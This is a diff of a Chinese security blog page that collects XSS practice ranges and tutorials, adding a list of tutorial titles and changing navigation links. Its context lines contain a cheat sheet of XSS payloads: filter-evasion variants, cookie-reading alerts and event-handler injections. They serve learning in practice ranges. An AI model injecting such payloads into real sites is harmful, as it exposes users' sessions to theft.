@@ -99,7 +99,7 @@
 <meta property="og:site_name" content="Openresty Python LUA">
 <meta property="og:description" content="xss靶场QQ群：397745473 谷歌的XSS GAME：http://xss-game.appspot.com/ xss挑战之旅：https://zhuanlan.zhihu.com/p/25336395 xss-quiz：http://hpdoger.me/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-07-25T06:30:13.000Z">
+<meta property="og:updated_time" content="2019-07-25T06:33:41.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss靶场和教程整理">
 <meta name="twitter:description" content="xss靶场QQ群：397745473 谷歌的XSS GAME：http://xss-game.appspot.com/ xss挑战之旅：https://zhuanlan.zhihu.com/p/25336395 xss-quiz：http://hpdoger.me/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8">
@@ -391,6 +391,13 @@
 <h1 id="常见XSS"><a href="#常见XSS" class="headerlink" title="常见XSS"></a>常见XSS</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; //默认形式</span><br><span class="line"></span><br><span class="line">&lt;ScrIpT&gt;alert(&quot;xss&quot;)&lt;/SCriPt&gt; //变换大小写</span><br><span class="line"></span><br><span class="line">&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--　　// &lt;!-- 表示的意思是 闭合注释</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--</span><br><span class="line"></span><br><span class="line">&quot;onclick=&quot;alert(document.cookie)</span><br><span class="line"></span><br><span class="line">&lt;img src=javascript:alert(&quot;xss&quot;)&gt;&lt;/img //变换形式</span><br><span class="line"></span><br><span class="line">&lt;img src=j&amp;#97vascript:alert(&quot;xss&quot;)&gt; //使用ASCII表示</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot; &gt; //插入干扰</span><br><span class="line"></span><br><span class="line">&lt;DIV STYLE=&quot;width:expression(alert(163));&quot;&gt; //其他属性</span><br><span class="line"></span><br><span class="line">&lt;DIV STYLE=&quot;xss:expr/*XSS*/ession(alert(163))&quot;&gt; //再干扰</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;#&quot; onerror=alert(/xss/)&gt; //借用事件</span><br><span class="line"></span><br><span class="line">&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;// flash跨站</span><br></pre></td></tr></table></figure>
 <h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>xss 原理 :<a href="http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html" target="_blank" rel="noopener">http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html</a></p>
 <p><a href="https://www.cnblogs.com/musicmovie/p/3445246.html" target="_blank" rel="noopener">https://www.cnblogs.com/musicmovie/p/3445246.html</a></p>
+<h1 id="xss-教程"><a href="#xss-教程" class="headerlink" title="xss 教程"></a>xss 教程</h1><p>1、【yueyan科普系列】XSS跨站脚本攻击–yueyan</p>
+<p>2、存储型XSS的成因及挖掘方法–pkav</p>
+<p>3、跨站脚本攻击实例解析–泉哥</p>
+<p>4、XSS高级实战教程–心伤的瘦子</p>
+<p>5、XSS利用与挖掘-更新版–GAINOVER</p>
+<p>6、XSS在线教学–gainover</p>
+<p><a href="http://xsst.sinaapp.com/example/1-1.php" target="_blank" rel="noopener">http://xsst.sinaapp.com/example/1-1.php</a></p>
 <h1 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h1><p>1.可以去推特翻一下xss payloads，上面会不定期放一些xss challenge：<a href="https://twitter.com/XssPayloads" target="_blank" rel="noopener">https://twitter.com/XssPayloads</a></p>
 <p>2.一些偏基础一点的靶场:<br>alert(1) to win<br>XSS Challenges<br>prompt(1) to win</p>
 <p>3.顺便推荐一个xss平台 个人感觉可以 beef</p>
@@ -458,8 +465,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/20/047_攻防环境搭建/" rel="next" title="攻防环境搭建">
-                <i class="fa fa-chevron-left"></i> 攻防环境搭建
+              <a href="/2019/07/20/053_ms17_010利用案例/" rel="next" title="ms17_010利用案例">
+                <i class="fa fa-chevron-left"></i> ms17_010利用案例
               </a>
             
           </div>
@@ -666,7 +673,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss靶场"><span class="nav-number">1.</span> <span class="nav-text">xss靶场</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#教程："><span class="nav-number">2.</span> <span class="nav-text">教程：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞银行的"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞银行的</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常见XSS"><span class="nav-number">3.</span> <span class="nav-text">常见XSS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS原理"><span class="nav-number">4.</span> <span class="nav-text">XSS原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#评论"><span class="nav-number">5.</span> <span class="nav-text">评论</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss靶场"><span class="nav-number">1.</span> <span class="nav-text">xss靶场</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#教程："><span class="nav-number">2.</span> <span class="nav-text">教程：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞银行的"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞银行的</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#常见XSS"><span class="nav-number">3.</span> <span class="nav-text">常见XSS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS原理"><span class="nav-number">4.</span> <span class="nav-text">XSS原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss-教程"><span class="nav-number">5.</span> <span class="nav-text">xss 教程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#评论"><span class="nav-number">6.</span> <span class="nav-text">评论</span></a></li></ol></div>
             
 
           </div>
